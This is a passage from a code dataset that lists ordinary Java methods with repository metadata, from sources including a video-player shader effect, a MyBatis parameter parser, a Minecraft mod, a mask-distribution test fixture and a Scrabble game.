monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ButtonRenderer_ButtonClickListener.java", "stars": "2", "class": {"name": "ButtonRenderer_ButtonClickListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ButtonRenderer_ButtonClickListener.java", "stars": "2", "class": {"name": "ButtonRenderer_ButtonClickListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ButtonRenderer_ButtonClickListener.java", "stars": "2", "class": {"name": "ButtonRenderer_ButtonClickListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "initValues", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initValues(GLSurfaceView mGlSurfaceView) {        mWidth = mGlSurfaceView.getWidth();        mHeight = mGlSurfaceView.getHeight();        mRandom = new Random(new Date().getTime());    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/LamoishEffect.java", "stars": "2", "class": {"name": "LamoishEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getShader", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {        initValues(mGlSurfaceView);        float scale[] = new float[2];        if (mWidth > mHeight) {            scale[0] = 1f;            scale[1] = ((float) mHeight) / mWidth;        } else {            scale[0] = ((float) mWidth) / mHeight;            scale[1] = 1f;        }        float max_dist = ((float) Math.sqrt(scale[0] * scale[0] + scale[1]                * scale[1])) * 0.5f;        float seed[] = {mRandom.nextFloat(), mRandom.nextFloat()};        String scaleString[] = new String[2];        String seedString[] = new String[2];        scaleString[0] = \"scale[0] = \" + scale[0] + \";\\n\";        scaleString[1] = \"scale[1] = \" + scale[1] + \";\\n\";        seedString[0] = \"seed[0] = \" + seed[0] + \";\\n\";        seedString[1] = \"seed[1] = \" + seed[1] + \";\\n\";        String inv_max_distString = \"inv_max_dist = \" + 1.0f / max_dist + \";\\n\";        String stepsizeString = \"stepsize = \" + 1.0f / 255.0f + \";\\n\";        String stepsizeXString = \"stepsizeX = \" + 1.0f / mWidth + \";\\n\";        String stepsizeYString = \"stepsizeY = \" + 1.0f / mHeight + \";\\n\";        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"                + \"precision mediump float;\\n\"                + \"uniform samplerExternalOES sTexture;\\n\"                + \" vec2 seed;\\n\"                + \" float stepsizeX;\\n\"                + \" float stepsizeY;\\n\"                + \" float stepsize;\\n\"                + \" vec2 scale;\\n\"                + \" float inv_max_dist;\\n\"                + \"varying vec2 vTextureCoord;\\n\"                + \"float rand(vec2 loc) {\\n\"                + \"  float theta1 = dot(loc, vec2(0.9898, 0.233));\\n\"                + \"  float theta2 = dot(loc, vec2(12.0, 78.0));\\n\"                + \"  float value = cos(theta1) * sin(theta2) + sin(theta1) * cos(theta2);\\n\"                +                // keep value of part1 in range: (2^-14 to 2^14).                \"  float temp = mod(197.0 * value, 1.0) + value;\\n\"                + \"  float part1 = mod(220.0 * temp, 1.0) + temp;\\n\"                + \"  float part2 = value * 0.5453;\\n\"                + \"  float part3 = cos(theta1 + theta2) * 0.43758;\\n\"                + \"  return fract(part1 + part2 + part3);\\n\" + \"}\\n\"                + \"void main() {\\n\"                // Parameters that were created above                + scaleString[0]                + scaleString[1]                + seedString[0]                + seedString[1]                + inv_max_distString                + stepsizeString                + stepsizeXString                + stepsizeYString                // sharpen                + \"  vec3 nbr_color = vec3(0.0, 0.0, 0.0);\\n\"                + \"  vec2 coord;\\n\"                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"                + \"  coord.x = vTextureCoord.x - 0.5 * stepsizeX;\\n\"                + \"  coord.y = vTextureCoord.y - stepsizeY;\\n\"                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"                + \"  coord.x = vTextureCoord.x - stepsizeX;\\n\"                + \"  coord.y = vTextureCoord.y + 0.5 * stepsizeY;\\n\"                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"                + \"  coord.x = vTextureCoord.x + stepsizeX;\\n\"                + \"  coord.y = vTextureCoord.y - 0.5 * stepsizeY;\\n\"                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"                + \"  coord.x = vTextureCoord.x + stepsizeX;\\n\"                + \"  coord.y = vTextureCoord.y + 0.5 * stepsizeY;\\n\"                + \"  nbr_color += texture2D(sTexture, coord).rgb - color.rgb;\\n\"                + \"  vec3 s_color = vec3(color.rgb + 0.3 * nbr_color);\\n\"                +                // cross process                \"  vec3 c_color = vec3(0.0, 0.0, 0.0);\\n\"                + \"  float value;\\n\"                + \"  if (s_color.r < 0.5) {\\n\"                + \"    value = s_color.r;\\n\"                + \"  } else {\\n\"                + \"    value = 1.0 - s_color.r;\\n\"                + \"  }\\n\"                + \"  float red = 4.0 * value * value * value;\\n\"                + \"  if (s_color.r < 0.5) {\\n\"                + \"    c_color.r = red;\\n\"                + \"  } else {\\n\"                + \"    c_color.r = 1.0 - red;\\n\"                + \"  }\\n\"                + \"  if (s_color.g < 0.5) {\\n\"                + \"    value = s_color.g;\\n\"                + \"  } else {\\n\"                + \"    value = 1.0 - s_color.g;\\n\"                + \"  }\\n\"                + \"  float green = 2.0 * value * value;\\n\"                + \"  if (s_color.g < 0.5) {\\n\"                + \"    c_color.g = green;\\n\"                + \"  } else {\\n\"                + \"    c_color.g = 1.0 - green;\\n\"                + \"  }\\n\"                + \"  c_color.b = s_color.b * 0.5 + 0.25;\\n\"                +                // blackwhite                \"  float dither = rand(vTextureCoord + seed);\\n\"                + \"  vec3 xform = clamp((c_color.rgb - 0.15) * 1.53846, 0.0, 1.0);\\n\"                + \"  vec3 temp = clamp((color.rgb + stepsize - 0.15) * 1.53846, 0.0, 1.0);\\n\"                + \"  vec3 bw_color = clamp(xform + (temp - xform) * (dither - 0.5), 0.0, 1.0);\\n\"                +                // vignette                \"  coord = vTextureCoord - vec2(0.5, 0.5);\\n\"                + \"  float dist = length(coord * scale);\\n\"                + \"  float lumen = 0.85 / (1.0 + exp((dist * inv_max_dist - 0.73) * 20.0)) + 0.15;\\n\"                + \"  gl_FragColor = vec4(bw_color * lumen, color.a);\\n\" + \"}\\n\";        ;        return shader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/LamoishEffect.java", "stars": "2", "class": {"name": "LamoishEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getSpanSize", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getSpanSize (int p0)\t{\t\treturn n_getSpanSize (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GridLayoutSpanSizeLookup.java", "stars": "2", "class": {"name": "GridLayoutSpanSizeLookup", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_getSpanSize", "params": ["int"], "throws": null, "modifiers": ["native", "private"], "return_type": "int", "snippet": "\tprivate native int n_getSpanSize (int p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GridLayoutSpanSizeLookup.java", "stars": "2", "class": {"name": "GridLayoutSpanSizeLookup", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GridLayoutSpanSizeLookup.java", "stars": "2", "class": {"name": "GridLayoutSpanSizeLookup", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GridLayoutSpanSizeLookup.java", "stars": "2", "class": {"name": "GridLayoutSpanSizeLookup", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "parse", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void parse(String expression) {    int p = skipWS(expression, 0);    if (expression.charAt(p) == '(') {      expression(expression, p + 1);    } else {      property(expression, p);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "expression", "params": ["String", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void expression(String expression, int left) {    int match = 1;    int right = left + 1;    while (match > 0) {      if (expression.charAt(right) == ')') {        match--;      } else if (expression.charAt(right) == '(') {        match++;      }      right++;    }    put(\"expression\", expression.substring(left, right - 1));    jdbcTypeOpt(expression, right);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "property", "params": ["String", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void property(String expression, int left) {    if (left < expression.length()) {      int right = skipUntil(expression, left, \",:\");      put(\"property\", trimmedStr(expression, left, right));      jdbcTypeOpt(expression, right);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "skipWS", "params": ["String", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int skipWS(String expression, int p) {    for (int i = p; i < expression.length(); i++) {      if (expression.charAt(i) > 0x20) {        return i;      }    }    return expression.length();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "skipUntil", "params": ["String", "int", "String"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int skipUntil(String expression, int p, final String endChars) {    for (int i = p; i < expression.length(); i++) {      char c = expression.charAt(i);      if (endChars.indexOf(c) > -1) {        return i;      }    }    return expression.length();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "jdbcTypeOpt", "params": ["String", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void jdbcTypeOpt(String expression, int p) {    p = skipWS(expression, p);    if (p < expression.length()) {      if (expression.charAt(p) == ':') {        jdbcType(expression, p + 1);      } else if (expression.charAt(p) == ',') {        option(expression, p + 1);      } else {        throw new BuilderException(\"Parsing error in {\" + expression + \"} in position \" + p);      }    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "jdbcType", "params": ["String", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void jdbcType(String expression, int p) {    int left = skipWS(expression, p);    int right = skipUntil(expression, left, \",\");    if (right > left) {      put(\"jdbcType\", trimmedStr(expression, left, right));    } else {      throw new BuilderException(\"Parsing error in {\" + expression + \"} in position \" + p);    }    option(expression, right + 1);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "option", "params": ["String", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void option(String expression, int p) {    int left = skipWS(expression, p);    if (left < expression.length()) {      int right = skipUntil(expression, left, \"=\");      String name = trimmedStr(expression, left, right);      left = right + 1;      right = skipUntil(expression, left, \",\");      String value = trimmedStr(expression, left, right);      put(name, value);      option(expression, right + 1);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "trimmedStr", "params": ["String", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String trimmedStr(String str, int start, int end) {    while (str.charAt(start) <= 0x20) {      start++;    }    while (str.charAt(end - 1) <= 0x20) {      end--;    }    return start >= end ? \"\" : str.substring(start, end);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/builder/ParameterExpression.java", "stars": "15", "class": {"name": "ParameterExpression", "extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleParquetSlabBlock.java", "stars": "2", "class": {"name": "JungleParquetSlabBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(this, state.get(TYPE) == SlabType.DOUBLE ? 2 : 1));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleParquetSlabBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "createParameterHandler", "params": ["MappedStatement", "Object", "BoundSql"], "throws": null, "modifiers": ["public"], "return_type": "ParameterHandler", "snippet": "  public ParameterHandler createParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql) {    return new DefaultParameterHandler(mappedStatement, parameterObject, boundSql);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLLanguageDriver.java", "stars": "15", "class": {"name": "XMLLanguageDriver", "extends": null, "implements": ["LanguageDriver"], "modifiers": ["public"]}}, {"method_name": "createSqlSource", "params": ["Configuration", "XNode", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "SqlSource", "snippet": "  public SqlSource createSqlSource(Configuration configuration, XNode script, Class<?> parameterType) {    XMLScriptBuilder builder = new XMLScriptBuilder(configuration, script, parameterType);    return builder.parseScriptNode();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLLanguageDriver.java", "stars": "15", "class": {"name": "XMLLanguageDriver", "extends": null, "implements": ["LanguageDriver"], "modifiers": ["public"]}}, {"method_name": "createSqlSource", "params": ["Configuration", "String", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "SqlSource", "snippet": "  public SqlSource createSqlSource(Configuration configuration, String script, Class<?> parameterType) {    // issue #3    if (script.startsWith(\"<script>\")) {      XPathParser parser = new XPathParser(script, false, configuration.getVariables(), new XMLMapperEntityResolver());      return createSqlSource(configuration, parser.evalNode(\"/script\"), parameterType);    } else {      // issue #127      script = PropertyParser.parse(script, configuration.getVariables());      TextSqlNode textSqlNode = new TextSqlNode(script);      if (textSqlNode.isDynamic()) {        return new DynamicSqlSource(configuration, textSqlNode);      } else {        return new RawSqlSource(configuration, script, parameterType);      }    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLLanguageDriver.java", "stars": "15", "class": {"name": "XMLLanguageDriver", "extends": null, "implements": ["LanguageDriver"], "modifiers": ["public"]}}, {"method_name": "aDistributionMasque", "params": ["String", "LocalDateTime", "TypeMasque"], "throws": null, "modifiers": ["public", "static"], "return_type": "DistributionMasque", "snippet": "    public static DistributionMasque aDistributionMasque(String demandeur, LocalDateTime dateDistribution, TypeMasque typeMasque) {        return DistributionMasque.builder()                .hashDemandeur(demandeur)                .dateDistribution(dateDistribution)                .nbPersonnes(4)                .typeMasque(typeMasque)                .nbMasques(11)                .modeSaisie(MANUEL)                .codePostal(\"75001\")                .typeRemettant(Mairie)                .build();    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/fixtures/DistributionMasqueFixture.java", "stars": "5", "class": {"name": "DistributionMasqueFixture", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "aDistributionMasque", "params": ["Integer"], "throws": null, "modifiers": ["public", "static"], "return_type": "DistributionMasque", "snippet": "    public static DistributionMasque aDistributionMasque(Integer nbMasques) {        return DistributionMasque.builder()                .hashDemandeur(\"08c71b89ad55b6828a2daa9fe89edea26de\")                .dateDistribution(LocalDateTime.of(2018, 8, 5, 19, 43))                .nbPersonnes(1)                .typeMasque(ADULTE_USAGE_UNIQUE)                .nbMasques(nbMasques)                .modeSaisie(MANUEL)                .codePostal(\"75001\")                .typeRemettant(Mairie)                .build();    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/fixtures/DistributionMasqueFixture.java", "stars": "5", "class": {"name": "DistributionMasqueFixture", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "aDistributionMasque", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DistributionMasque", "snippet": "    public static DistributionMasque aDistributionMasque() {        return aDistributionMasque(23);    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/domain/fixtures/DistributionMasqueFixture.java", "stars": "5", "class": {"name": "DistributionMasqueFixture", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTag", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTag() {        return tag;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTag", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTag(String tag) {        this.tag = tag;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCategory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCategory() {        return category;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCategory", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCategory(String category) {        this.category = category;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getStatus() {        return status;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStatus", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(String status) {        this.status = status;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTitle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {        return title;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTitle", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {        this.title = title;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContent() {        return content;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setContent", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContent(String content) {        this.content = content;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {        return type;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {        this.type = type;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStartTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getStartTime() {        return startTime;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStartTime", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStartTime(Integer startTime) {        this.startTime = startTime;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEndTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getEndTime() {        return endTime;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEndTime", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEndTime(Integer endTime) {        this.endTime = endTime;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/dto/cond/ContentCond.java", "stars": "2", "class": {"name": "ContentCond", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "remainingLettersPostBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Integer>", "snippet": "\tpublic ArrayList<Integer> remainingLettersPostBuilder() {\t\treturn totalLettersCreation;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "verifierLettre", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "char", "snippet": "\tpublic char verifierLettre(int index) {\t\t// Afficher la lettre avec l'index de localisation\t\treturn (char) main[index];\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "verifierMain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int[] verifierMain() {\t\treturn main;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "verifierNom", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String verifierNom() {\t\treturn nom;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "verifierScore", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int verifierScore() {\t\treturn score;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "verifierTour", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean verifierTour() {\t\treturn monTour;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "verifierTourPasser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean verifierTourPasser() {\t\treturn (tourPasser >= 3);\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "incrementTourPasser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void incrementTourPasser() {\t\ttourPasser++;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "resetTourPasser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void resetTourPasser() {\t\ttourPasser = 0;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setNom", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setNom(String nouveauNom) {\t\tnom = nouveauNom;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "commencerTour", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void commencerTour() {\t\tmonTour = true;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": 